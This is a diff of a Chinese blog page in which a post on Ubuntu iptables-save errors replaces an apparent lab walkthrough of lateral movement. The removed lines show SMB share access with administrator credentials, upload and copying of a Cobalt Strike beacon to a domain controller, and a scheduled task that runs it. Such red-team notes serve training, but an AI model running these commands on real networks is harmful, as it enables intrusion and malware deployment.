@@ -6,26 +6,26 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>横向移动 | 0pen1的博客</title>
+  <title>Ubuntu执行service iptables -save报错iptables：unrecognized service 的解决方法 | 0pen1的博客</title>
   <meta name="author" content="0pen1">
   
-  <meta name="description" content="横向移动对 DC(10.10.10.2)目标主机建立共享连接，并查看目标主机共享资源。
-12shell net use \\10.10.10.2 /user:administrator &amp;quot;JDredteam666&amp;quot;shell net view \\10.10.10.2
+  <meta name="description" content="问题描述：
 
+解决办法：
+因为Ubuntu默认使用的防火墙并不是iptables，所以使用iptables之前需要先禁用UFW。
+命令如下：
+1sudo ufw disable
 
-列出目标主机 C 盘下目录文件。
-1shell dir \\10.10.10.2\C$
+类似地，在CentOS 7服务器的情况下，防火墙也可能是冲突的一个原因。FirewallD默认包含在CentOS 7中。
+1service iptables save
 
-
-将CS木马上传到跳板机。
-1upload C:\Users\asus\Desktop\beacon.exe (C:\Users\Server\Desktop\beacon.exe)
-
-将server(192.168.111.3)跳板机的木马文件copy到DC(10.10.10.2)目标机的C共享盘下。"> 
+有时，在Ubuntu服务器中执行以下命令会返回一个无法识别的服务消息。
+该命令基于/etc/init.d文件夹中iptables的启动脚本起作用。 通常，此命令适用于RHEL / Red Hat / CentOS。 在Ubuntu中，要保存防火墙规则的更改，我们使用以下命令"> 
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="横向移动"/>
+  <meta property="og:title" content="Ubuntu执行service iptables -save报错iptables：unrecognized service 的解决方法"/>
   <meta property="og:site_name" content="0pen1的博客"/>
 
   
@@ -116,7 +116,7 @@
 
 	
 		<div class="page-header">
-			<h1> 横向移动</h1>
+			<h1> Ubuntu执行service iptables -save报错iptables：unrecognized service 的解决方法</h1>
 		</div>
 	
 
@@ -133,25 +133,21 @@
 	<div class="mypage">		
 	  		
 
-	  <h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>对 DC(10.10.10.2)目标主机建立共享连接，并查看目标主机共享资源。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\10.10.10.2 /user:administrator <span class="string">&quot;JDredteam666&quot;</span></span><br><span class="line">shell net view \\10.10.10.2</span><br></pre></td></tr></table></figure>
+	  <p>问题描述：</p>
+<p><img src="Ubuntu%E6%89%A7%E8%A1%8Cservice-iptables-save%E6%8A%A5%E9%94%99iptables%EF%BC%9Aunrecognized-service-%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.assets/image-20210511171538464-1620724541793.png" alt="image-20210511171538464"></p>
+<p>解决办法：</p>
+<p>因为Ubuntu默认使用的防火墙并不是iptables，所以使用iptables之前需要先禁用UFW。</p>
+<p>命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure>
 
-<p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109170638929.png" alt="image-20210109170638929"></p>
-<p>列出目标主机 C 盘下目录文件。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\10.10.10.2\C$</span><br></pre></td></tr></table></figure>
+<p>类似地，在CentOS 7服务器的情况下，防火墙也可能是冲突的一个原因。FirewallD默认包含在CentOS 7中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables save</span><br></pre></td></tr></table></figure>
 
-<p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109170959454.png" alt="image-20210109170959454"></p>
-<p>将CS木马上传到跳板机。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload C:\Users\asus\Desktop\beacon.exe (C:\Users\Server\Desktop\beacon.exe)</span><br></pre></td></tr></table></figure>
+<p>有时，在Ubuntu服务器中执行以下命令会返回一个无法识别的服务消息。</p>
+<p>该命令基于/etc/init.d文件夹中iptables的启动脚本起作用。 通常，此命令适用于RHEL / Red Hat / CentOS。 在Ubuntu中，要保存防火墙规则的更改，我们使用以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;sbin&#x2F;iptables-save</span><br></pre></td></tr></table></figure>
 
-<p>将server(192.168.111.3)跳板机的木马文件copy到DC(10.10.10.2)目标机的C共享盘下。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy C:\Users\Server\Desktop\beacon.exe \\10.10.10.2\C$</span><br></pre></td></tr></table></figure>
-
-<p>远程创建Win 2012(192.168.200.66)目标机计划任务执行木马文件。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /create /s 10.10.10.2 /u administrator /p <span class="string">&quot;JDredteam&quot;</span> /sc MINUTE /mo 1 /tn <span class="built_in">test</span> /tr <span class="string">&quot;C:\\beacon.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>成功上线，该会话为被动连接，不操作的不会回连，如果中转机会话断掉，该会话也会断掉。</p>
-<p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109202117004.png" alt="image-20210109202117004"></p>
+<p>但是，如果坚持使用与以前相同的命令，我们可以在/etc/init.d文件夹中添加自定义的可执行启动脚本。 这样可以有效地解决错误。</p>
 
 	  <div class="article-footer-copyright">
 
@@ -161,7 +157,7 @@
 	</div>
 
 	
-	<span id="/2021/04/20/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="leancloud-visitors view" data-flag-title="横向移动">
+	<span id="/2021/05/11/Ubuntu%E6%89%A7%E8%A1%8Cservice-iptables-save%E6%8A%A5%E9%94%99iptables%EF%BC%9Aunrecognized-service-%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" class="leancloud-visitors view" data-flag-title="Ubuntu执行service iptables -save报错iptables：unrecognized service 的解决方法">
 		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
 	</span>
 	
@@ -172,13 +168,12 @@
 
     
     
-    <a href="/2021/05/11/Ubuntu执行service-iptables-save报错iptables：unrecognized-service-的解决方法/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2021/04/20/域操作基本命令/" type="button" class="btn btn-default ">Next<i
+    <a href="/2021/04/20/横向移动/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -235,7 +230,7 @@ new Valine(valineConfig);
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2021-04-20 
+	2021-05-11 
 	</div>
 	
 
@@ -246,7 +241,7 @@ new Valine(valineConfig);
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="/categories/内网攻防/">内网攻防<span>2</span></a></li>
+    <li><a href="/categories/iptables/">iptables<span>1</span></a></li>
   </li>
 
     </ul>
@@ -259,7 +254,7 @@ new Valine(valineConfig);
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/横向移动/">横向移动<span>1</span></a></li>
+  <li><a href="/tags/iptables/">iptables<span>2</span></a></li>
     </ul>
 	</div>
 		
